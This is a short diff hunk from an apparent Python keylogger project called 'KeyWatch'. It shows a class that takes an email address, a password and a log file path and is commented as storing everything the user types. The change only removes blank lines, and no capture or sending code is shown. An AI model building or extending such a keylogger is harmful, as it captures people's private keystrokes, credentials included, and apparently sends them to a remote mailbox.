@@ -7,8 +7,6 @@ from pynput.keyboard import Key
 
 ### 🛠️ Project: KeyWatch – Advanced Keystroke Logger
 
-
-
 class Kelogger:
   def __init__(self, time_interval, email, password, LOG_FILE_PATH):
     # self.log: a variable to store everything that the user writes (temporary registration).
